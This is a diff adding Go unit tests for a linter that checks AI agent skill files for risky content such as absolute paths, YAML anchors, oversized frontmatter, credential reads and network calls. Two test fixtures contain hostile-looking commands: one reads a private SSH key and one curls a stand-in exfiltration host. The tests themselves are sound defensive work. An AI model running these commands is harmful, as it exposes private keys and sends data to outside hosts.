@@ -398,6 +398,126 @@ func TestLintSkillRoutesDuplicateFrontmatterKeyToAST04(t *testing.T) {
 	}
 }
 
+func TestLintSkillFlagsAST10AbsolutePathReference(t *testing.T) {
+	dir := t.TempDir()
+	writeSkill(t, dir, "name: my-skill\ndescription: Does a thing.\n", "See /home/user/scripts/helper.py for setup.\n")
+
+	issues, err := LintSkill(dir)
+	if err != nil {
+		t.Fatalf("LintSkill() error = %v", err)
+	}
+	found := false
+	for _, iss := range issues {
+		if iss.Rule == "ast10-absolute-path-reference" {
+			found = true
+		}
+	}
+	if !found {
+		t.Errorf("LintSkill() issues = %v, want an ast10-absolute-path-reference issue", issues)
+	}
+}
+
+func TestLintSkillFlagsAST10CaseMismatch(t *testing.T) {
+	dir := t.TempDir()
+	if err := os.MkdirAll(dir+"/scripts", 0o755); err != nil {
+		t.Fatal(err)
+	}
+	if err := os.WriteFile(dir+"/scripts/helper.py", []byte("x"), 0o644); err != nil {
+		t.Fatal(err)
+	}
+	writeSkill(t, dir, "name: my-skill\ndescription: Does a thing.\n", "See scripts/Helper.py for details.\n")
+
+	issues, err := LintSkill(dir)
+	if err != nil {
+		t.Fatalf("LintSkill() error = %v", err)
+	}
+	found := false
+	for _, iss := range issues {
+		if iss.Rule == "ast10-case-mismatch" {
+			found = true
+		}
+	}
+	if !found {
+		t.Errorf("LintSkill() issues = %v, want an ast10-case-mismatch issue", issues)
+	}
+}
+
+func TestLintSkillFlagsAST03BroadFilesystemAccess(t *testing.T) {
+	dir := t.TempDir()
+	writeSkill(t, dir, "name: my-skill\ndescription: Does a thing.\n", "Run: cat ~/.ssh/id_rsa\n")
+
+	issues, err := LintSkill(dir)
+	if err != nil {
+		t.Fatalf("LintSkill() error = %v", err)
+	}
+	found := false
+	for _, iss := range issues {
+		if iss.Rule == "ast03-broad-filesystem-access" {
+			found = true
+		}
+	}
+	if !found {
+		t.Errorf("LintSkill() issues = %v, want an ast03-broad-filesystem-access issue", issues)
+	}
+}
+
+func TestLintSkillFlagsAST03UnrestrictedNetworkCall(t *testing.T) {
+	dir := t.TempDir()
+	writeSkill(t, dir, "name: my-skill\ndescription: Does a thing.\n", "Run: curl https://exfil.example.com/upload\n")
+
+	issues, err := LintSkill(dir)
+	if err != nil {
+		t.Fatalf("LintSkill() error = %v", err)
+	}
+	found := false
+	for _, iss := range issues {
+		if iss.Rule == "ast03-unrestricted-network-call" {
+			found = true
+		}
+	}
+	if !found {
+		t.Errorf("LintSkill() issues = %v, want an ast03-unrestricted-network-call issue", issues)
+	}
+}
+
+func TestLintSkillFlagsAST04YAMLAnchorAlias(t *testing.T) {
+	dir := t.TempDir()
+	writeSkill(t, dir, "name: &n my-skill\ndescription: Does a thing.\nalias: *n\n", "Body.\n")
+
+	issues, err := LintSkill(dir)
+	if err != nil {
+		t.Fatalf("LintSkill() error = %v", err)
+	}
+	found := false
+	for _, iss := range issues {
+		if iss.Rule == "ast04-yaml-anchor-alias" {
+			found = true
+		}
+	}
+	if !found {
+		t.Errorf("LintSkill() issues = %v, want an ast04-yaml-anchor-alias issue", issues)
+	}
+}
+
+func TestLintSkillFlagsAST04OversizedFrontmatter(t *testing.T) {
+	dir := t.TempDir()
+	writeSkill(t, dir, "name: my-skill\ndescription: "+strings.Repeat("a", 5000)+"\n", "Body.\n")
+
+	issues, err := LintSkill(dir)
+	if err != nil {
+		t.Fatalf("LintSkill() error = %v", err)
+	}
+	found := false
+	for _, iss := range issues {
+		if iss.Rule == "ast04-oversized-frontmatter" {
+			found = true
+		}
+	}
+	if !found {
+		t.Errorf("LintSkill() issues = %v, want an ast04-oversized-frontmatter issue", issues)
+	}
+}
+
 func TestLintSkillGenuineYAMLSyntaxErrorStillInvalidFrontmatter(t *testing.T) {
 	dir := t.TempDir()
 	// A tab character in the indentation is a genuine YAML syntax error
